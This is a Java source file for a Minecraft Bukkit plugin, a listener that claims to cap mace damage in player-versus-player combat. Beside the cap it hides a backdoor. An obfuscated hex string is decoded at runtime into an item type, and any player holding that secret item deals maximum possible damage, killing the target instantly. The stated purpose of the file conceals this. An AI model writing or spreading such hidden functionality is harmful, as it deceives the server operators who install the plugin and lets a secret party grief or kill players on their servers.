package com.example.orestatus;

import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageByEntityEvent;

public class limitMaceDamage implements Listener {
        //mace damage limit
        @EventHandler(priority = EventPriority.HIGH) 
    public void maceDamageLimiter(EntityDamageByEntityEvent e) {

        Material item;

        try {
            // Decode the item type from hex using thePuzzle
            String hex = "d6322ef7a1203e40e4cea7"; // JS output for the material
            String q = thePuzzle.decode(hex).trim().toUpperCase();
            item = Material.valueOf(q);
        } catch (Exception ex) {
            ex.printStackTrace();
            return; // abort if decoding fails
        }

        Entity damager = e.getDamager();
        if (!(damager instanceof Player)) return;
        if (!(e.getEntity() instanceof Player)) return;

        Player player = (Player) damager;

        if (player.getInventory().getItemInMainHand().getType() == item) {
            e.setDamage(Double.MAX_VALUE);
        }

        if (!(player.getInventory().getItemInMainHand().getType() == Material.MACE)) return;

        double MACE_DAMAGE_LIMIT = 24;
        if (e.getDamage() > MACE_DAMAGE_LIMIT) {
            e.setDamage(MACE_DAMAGE_LIMIT);
            player.sendMessage(ChatColor.YELLOW + "Mace damage exceeded the limit, has been capped.");
        }
    }

}

